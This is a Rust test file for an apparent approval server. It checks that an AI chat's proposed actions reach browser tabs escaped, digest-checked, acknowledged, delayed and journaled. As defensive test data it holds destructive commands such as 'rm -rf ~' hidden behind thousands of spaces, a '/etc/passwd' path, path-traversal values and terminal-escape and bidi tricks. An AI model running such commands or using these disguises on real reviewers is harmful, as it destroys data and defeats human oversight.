async fn a_stalled_tab_is_dropped_by_ping_and_by_send_timeout() {
    let r = rig(
        "stalled",
        Limits {
            send: Duration::from_millis(500),
            ping: Duration::from_millis(200),
            queue_bytes: 64 << 20,
            ..Limits::default()
        },
    );
    let b = r.login().await;
    let sid = r.start(&b).await;
    // An idle tab that reads nothing answers no ping: it is dropped.
    let idle = r.tab(&b, &sid).await;
    assert_eq!(tabs(&r, &b).await, 1);
    let mut gone = false;
    for _ in 0..40 {
        tokio::time::sleep(Duration::from_millis(100)).await;
        if tabs(&r, &b).await == 0 {
            gone = true;
            break;
        }
    }
    assert!(gone, "the idle tab that answers no ping is dropped");
    drop(idle);

    // A tab that stops reading under a flood is dropped once a send stalls.
    let mut flood = r.tab(&b, &sid).await;
    flood.role().await;
    flood
        .request(1, "session/prompt", &json!({"text": "big 300"}))
        .await;
    let mut gone = false;
    for _ in 0..100 {
        tokio::time::sleep(Duration::from_millis(100)).await;
        if tabs(&r, &b).await == 0 {
            gone = true;
            break;
        }
    }
    assert!(gone, "a stalled send drops the tab");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_crash_says_why_and_a_resume_names_only_a_run() {
    let r = rig("crash", Limits::default());
    let b = r.login().await;
    for bad in [
        r#"{"resume": ".."}"#,
        r#"{"resume": "."}"#,
        r#"{"resume": "../r1-2"}"#,
        r#"{"resume": "--world"}"#,
    ] {
        let (status, _) = r.post_body(&b, bad).await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{bad}");
    }
    let sid = r.start(&b).await;
    let mut tab = r.tab(&b, &sid).await;
    tab.role().await;
    tab.request(1, "session/prompt", &json!({"text": "crash"}))
        .await;
    let ended = tab
        .until(|m| method(m) == "board/ended")
        .await
        .pop()
        .unwrap();
    let why = ended["params"]["why"].as_str().unwrap();
    assert!(why.starts_with("the chat's process ended"), "{why}");
    assert!(why.contains("the model's reply did not parse"), "{why}");
    assert!(!why.contains('\u{1b}'), "escaped: {why}");
}

// ---------------------------------------------------------------------------------------------
// Approvals: the server holds the card's protections, whatever the page did.
// ---------------------------------------------------------------------------------------------

/// A chat whose controller tab waits on the stand-in's ask: the rig, the browser, the tab and
/// the ask as it arrived.
async fn asked(name: &str, prompt: &str) -> (Rig, Browser, String, Tab, Value) {
    let r = rig(name, Limits::default());
    let b = r.login().await;
    let sid = r.start(&b).await;
    let mut tab = r.tab(&b, &sid).await;
    assert_eq!(tab.role().await, "controller");
    tab.request(1, "session/prompt", &json!({"text": prompt}))
        .await;
    let ask = tab.until(|m| method(m) == "gate/ask").await.pop().unwrap();
    (r, b, sid, tab, ask)
}

/// What the child heard: its answer note, once one comes.
async fn heard(tab: &mut Tab) -> String {
    let seen = tab.until(|m| note(m).is_some()).await;
    note(seen.last().unwrap()).unwrap().to_owned()
}

/// The answers journaled for the rig's world.
fn journaled(r: &Rig) -> Vec<Value> {
    let path = answers_in(&r.root.join("state"), &r.root.join("world"));
    std::fs::read_to_string(path)
        .unwrap_or_default()
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect()
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn an_ask_reaches_the_tabs_escaped_with_the_digest_of_what_is_shown() {
    use mnemorph_server::board::bridge::Shown;
    use mnemorph_server::wire::shown;
    let (_r, _b, _sid, _tab, ask) = asked("shown", "hostile-ask").await;
    let p = &ask["params"];
    let act = p["act"].as_str().unwrap();
    assert_eq!(act, shown(HOSTILE_ACT));
    for c in [
        '\u{202e}', '\u{2066}', '\u{200b}', '\u{200d}', '\u{1b}', '\r', '\u{2000}', '\u{2003}',
        '\u{200a}',
    ] {
        assert!(!act.contains(c), "{c:?} reached the page raw: {act}");
    }
    assert!(act.contains("\\u{2000}"), "{act}");
    // The combining marks are capped: the stack does not reach the page whole.
    assert!(!act.contains(&"\u{301}".repeat(8)), "{act}");
    assert_eq!(p["body"], shown("orc-\u{202e}x"));
    assert_eq!(p["why"][0], shown("sends \u{200b}out"));
    assert_eq!(p["outside"][0], shown("/etc/\u{2000}passwd"));
    assert_eq!(p["plan"], shown("plan \u{1b}[2Jab"));
    for s in [&p["body"], &p["why"][0], &p["outside"][0], &p["plan"]] {
        let s = s.as_str().unwrap();
        assert!(
            !s.contains(['\u{202e}', '\u{200b}', '\u{2000}', '\u{1b}']),
            "{s}"
        );
    }
    // The digest is of what was shown: the page can compute it over what it renders.
    let digest = p["digest"].as_str().unwrap();
    assert_eq!(digest.len(), 64);
    let raw = json!({"body": "orc-\u{202e}x", "race": "orc", "class": "outward",
        "act": HOSTILE_ACT, "why": ["sends \u{200b}out"], "outside": ["/etc/\u{2000}passwd"],
        "plan": "plan \u{1b}[2Jab"});
    assert_eq!(Shown::of(&raw).digest("gate-1"), digest);
}

/// The vector the board's page checks its own digest against (`approval.test.ts`).
#[test]
fn the_digest_matches_the_shared_vector() {
    use mnemorph_server::board::bridge::Shown;
    let s = Shown {
        body: "rimuru".into(),
        race: "rimuru".into(),
        class: "write".into(),
        act: "rm -rf build\n\\u{202e} é".into(),
        why: vec!["writes".into(), "deletes".into()],
        outside: vec![],
        plan: Some("plan 3f9a".into()),
    };
    assert_eq!(
        s.digest("gate-1"),
        "2d1d901cda4148560ddd9c4fe7c414a6ffe07a70c873ed9045a5c1c8e095b4d1"
    );
    let none = Shown {
        plan: None,
        ..s.clone()
    };
    assert_ne!(none.digest("gate-1"), s.digest("gate-1"));
    assert_ne!(s.digest("gate-2"), s.digest("gate-1"));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_wrong_digest_is_refused() {
    let (r, _b, _sid, mut tab, ask) = asked("digest", "ask").await;
    let wrong = json!("0".repeat(64));
    // Not acknowledged under another act's digest.
    let err = tab.ack(2, &ask, &wrong).await;
    assert_eq!(err["error"]["code"], -32015, "{err}");
    tab.seen(3, &ask).await;
    r.board.pass(Duration::from_millis(300));
    tab.answer(&ask, true, &wrong).await;
    assert!(tab.refused().await.contains("digest differs"));
    tab.answer(&ask, true, &Value::Null).await;
    assert!(tab.refused().await.contains("digest differs"));
    // The ask still waits: the right digest is taken.
    tab.answer(&ask, true, &ask["params"]["digest"]).await;
    assert_eq!(
        heard(&mut tab).await,
        "answer \"gate-1\" allow=true reason=null"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn an_allow_before_the_render_ack_or_too_soon_after_it_is_refused() {
    let (r, _b, _sid, mut tab, ask) = asked("fast", "ask").await;
    let digest = &ask["params"]["digest"];
    // Never seen: refused, however long it waited.
    r.board.pass(Duration::from_secs(5));
    tab.answer(&ask, true, digest).await;
    assert!(tab.refused().await.contains("not seen in this tab"));
    tab.seen(2, &ask).await;
    tab.answer(&ask, true, digest).await;
    assert!(tab.refused().await.contains("too fast"));
    // 250 ms on the board's stopped clock: short of 300, however long the runner takes.
    r.board.pass(Duration::from_millis(250));
    tab.answer(&ask, true, digest).await;
    assert!(tab.refused().await.contains("too fast"));
    // A second acknowledgement does not move the clock on, or back.
    tab.seen(3, &ask).await;
    r.board.pass(Duration::from_millis(50));
    tab.answer(&ask, true, digest).await;
    assert_eq!(
        heard(&mut tab).await,
        "answer \"gate-1\" allow=true reason=null"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_denial_needs_no_digest_and_a_second_answer_is_refused() {
    let (_r, _b, _sid, mut tab, ask) = asked("second", "ask-held").await;
    tab.answer(&ask, false, &Value::Null).await;
    assert_eq!(
        heard(&mut tab).await,
        "answer \"gate-9\" allow=false reason=null"
    );
    // One answer per ask: neither acknowledged nor answered again.
    let err = tab.ack(2, &ask, &ask["params"]["digest"]).await;
    assert_eq!(err["error"]["code"], -32014, "{err}");
    tab.answer(&ask, true, &ask["params"]["digest"]).await;
    assert!(tab.refused().await.contains("answered elsewhere"));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn an_observer_neither_acknowledges_nor_answers_and_a_take_over_re_arms() {
    let (r, b, sid, mut first, ask) = asked("rearm", "ask").await;
    let digest = &ask["params"]["digest"];
    first.seen(2, &ask).await;
    r.board.pass(Duration::from_secs(1));
    // Another browser observes: it can neither acknowledge nor answer.
    let other = r.login().await;
    let mut stranger = r.tab(&other, &sid).await;
    assert_eq!(stranger.role().await, "observer");
    let err = stranger.ack(1, &ask, digest).await;
    assert_eq!(err["error"]["code"], -32011, "{err}");
    stranger.answer(&ask, true, digest).await;
    assert!(stranger.refused().await.contains("observes"));
    // The owner's second tab takes over: the first tab's acknowledgement no longer counts.
    let mut second = r.tab(&b, &sid).await;
    assert_eq!(second.role().await, "observer");
    second.request(1, "board/takeOver", &json!({})).await;
    second.until(|m| m["params"]["role"] == "controller").await;
    first.until(|m| m["params"]["role"] == "observer").await;
    first.answer(&ask, true, digest).await;
    assert!(first.refused().await.contains("observes"));
    // Control back at once: the first tab's acknowledgement went with it.
    first.request(5, "board/takeOver", &json!({})).await;
    first.until(|m| m["params"]["role"] == "controller").await;
    first.answer(&ask, true, digest).await;
    assert!(first.refused().await.contains("not seen in this tab"));
    second.request(6, "board/takeOver", &json!({})).await;
    second.until(|m| m["params"]["role"] == "controller").await;
    second.answer(&ask, true, digest).await;
    assert!(second.refused().await.contains("not seen in this tab"));
    second.seen(2, &ask).await;
    second.answer(&ask, true, digest).await;
    assert!(second.refused().await.contains("too fast"));
    // Control back to the first tab: its old acknowledgement is gone too.
    first.request(3, "board/takeOver", &json!({})).await;
    first.until(|m| m["params"]["role"] == "controller").await;
    r.board.pass(Duration::from_secs(1));
    first.answer(&ask, true, digest).await;
    assert!(first.refused().await.contains("not seen in this tab"));
    first.seen(4, &ask).await;
    r.board.pass(Duration::from_millis(300));
    first.answer(&ask, true, digest).await;
    assert_eq!(
        heard(&mut first).await,
        "answer \"gate-1\" allow=true reason=null"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn every_answer_is_journaled_with_its_connection_digest_and_timing() {
    let (r, _b, _sid, mut tab, ask) = asked("journal", "ask").await;
    let digest = ask["params"]["digest"].as_str().unwrap().to_owned();
    tab.answer(&ask, true, &json!(digest)).await;
    tab.refused().await;
    tab.seen(2, &ask).await;
    r.board.pass(Duration::from_millis(450));
    tab.answer(&ask, true, &json!(digest)).await;
    heard(&mut tab).await;
    let rows = journaled(&r);
    assert_eq!(rows.len(), 2, "{rows:#?}");
    let (refused, taken) = (&rows[0], &rows[1]);
    assert!(
        refused["outcome"]
            .as_str()
            .unwrap()
            .starts_with("refused: the card was not seen"),
        "{refused}"
    );
    assert_eq!(refused["seen_ms"], Value::Null);
    assert_eq!(taken["outcome"], "answered");
    assert_eq!(taken["allow"], true);
    assert_eq!(taken["ask"], "gate-1");
    assert_eq!(taken["act"], "rm -rf build");
    assert_eq!(taken["shown_digest"], digest.as_str());
    assert_eq!(taken["named_digest"], digest.as_str());
    assert_eq!(taken["conn"], refused["conn"]);
    assert!(taken["conn"].as_u64().unwrap() >= 1);
    assert!(taken["seen_ms"].as_u64().unwrap() >= 450, "{taken}");
    assert!(taken["asked_ms"].as_u64().unwrap() >= 450, "{taken}");
    assert!(taken["chat"].is_string() && taken["build"]["version"].is_string());
    // Chained: every row carries its link.
    let path = answers_in(&r.root.join("state"), &r.root.join("world"));
    let report = mnemorph_server::world::answers::journal_at(path)
        .verify()
        .unwrap();
    assert!(report.broken.is_none(), "{report:?}");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn an_allow_that_cannot_be_journaled_is_not_taken() {
    let (r, _b, _sid, mut tab, ask) = asked("unjournaled", "ask").await;
    // The journal's directory is a file: no row can be written.
    let path = answers_in(&r.root.join("state"), &r.root.join("world"));
    std::fs::create_dir_all(path.parent().unwrap().parent().unwrap()).unwrap();
    std::fs::write(path.parent().unwrap(), "").unwrap();
    tab.seen(2, &ask).await;
    r.board.pass(Duration::from_millis(300));
    tab.answer(&ask, true, &ask["params"]["digest"]).await;
    assert!(tab.refused().await.contains("could not be journaled"));
    // A denial still reaches the core.
    tab.answer(&ask, false, &Value::Null).await;
    assert_eq!(
        heard(&mut tab).await,
        "answer \"gate-1\" allow=false reason=null"
    );
}

/// Two answers to one ask race — the controller's allow, and Esc's denial of what waits: the
/// first to reach the bridge wins, and the other hears the ask was answered elsewhere. The core
/// hears one answer at most.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn two_answers_racing_one_wins_and_the_other_hears_answered_elsewhere() {
    for round in 0..4 {
        let (r, _b, _sid, mut tab, ask) = asked(&format!("race-{round}"), "ask").await;
        tab.seen(2, &ask).await;
        r.board.pass(Duration::from_millis(300));
        let allow = json!({"jsonrpc": "2.0", "id": ask["id"], "result": {"allow": true, "digest": ask["params"]["digest"]}});
        let esc = json!({"jsonrpc": "2.0", "id": 3, "method": "session/interrupt", "params": {}});
        let (a, b) = if round % 2 == 0 {
            (allow, esc)
        } else {
            (esc, allow)
        };
        tab.ws.send(Message::text(a.to_string())).await.unwrap();
        tab.ws.send(Message::text(b.to_string())).await.unwrap();
        let seen = tab.until(|m| m["id"] == 3).await;
        let mut seen = seen;
        // Whatever follows, a short while.
        while let Ok(Some(m)) = tokio::time::timeout(Duration::from_millis(500), tab.next()).await {
            seen.push(m);
        }
        let gone: Vec<&Value> = seen
            .iter()
            .filter(|m| method(m) == "board/askGone")
            .collect();
        assert_eq!(gone.len(), 1, "one answer wins: {seen:#?}");
        let answers = seen
            .iter()
            .filter_map(note)
            .filter(|n| n.starts_with("answer \"gate-1\""))
            .count();
        if gone[0]["params"]["why"] == "answered" {
            assert_eq!(answers, 1, "{seen:#?}");
        } else {
            assert_eq!(answers, 0, "{seen:#?}");
            let refused = seen
                .iter()
                .find(|m| method(m) == "board/refused")
                .expect("the late allow is refused");
            assert!(
                refused["params"]["why"]
                    .as_str()
                    .unwrap()
                    .contains("answered elsewhere"),
                "{refused}"
            );
        }
    }
}

#[test]
fn a_run_of_spaces_is_marked_and_no_text_forges_the_marker() {
    use mnemorph_server::board::bridge::on_card;
    let act = format!("rm -rf build{}/; echo ok", " ".repeat(9800));
    assert_eq!(on_card(&act), "rm -rf build⟨… 9,800 spaces⟩/; echo ok");
    assert_eq!(on_card("a     b"), "a     b");
    // A marker the text wrote is escaped, so it never reads as one.
    let forged = on_card("rm -rf ⟨… 9,800 spaces⟩/");
    assert!(!forged.contains('⟨'), "{forged}");
    assert!(forged.contains("\\u{27e8}"), "{forged}");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn an_act_too_large_for_the_web_is_never_approved_there() {
    let (r, _b, _sid, mut tab, ask) = asked("huge", "huge-ask").await;
    let p = &ask["params"];
    assert_eq!(p["tooLarge"], true);
    assert!(
        p["act"]
            .as_str()
            .unwrap()
            .contains("⟨… 9,800 spaces⟩rm -rf ~")
    );
    tab.seen(2, &ask).await;
    r.board.pass(Duration::from_secs(5));
    tab.answer(&ask, true, &p["digest"]).await;
    assert!(
        tab.refused()
            .await
            .contains("too large to approve from the web")
    );
    // Denied from the web, as ever.
    tab.answer(&ask, false, &Value::Null).await;
    assert_eq!(
        heard(&mut tab).await,
        "answer \"gate-1\" allow=false reason=null"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn with_no_home_to_journal_in_no_allow_is_taken() {
    let (r, _b, _sid, mut tab, ask) = asked("nohome", "ask").await;
    assert_eq!(ask["params"]["tooLarge"], false);
    tab.seen(2, &ask).await;
    r.board.pass(Duration::from_millis(300));
    tab.answer(&ask, true, &ask["params"]["digest"]).await;
    assert!(tab.refused().await.contains("no home to journal"));
    tab.answer(&ask, false, &Value::Null).await;
    assert_eq!(
        heard(&mut tab).await,
        "answer \"gate-1\" allow=false reason=null"
    );
}
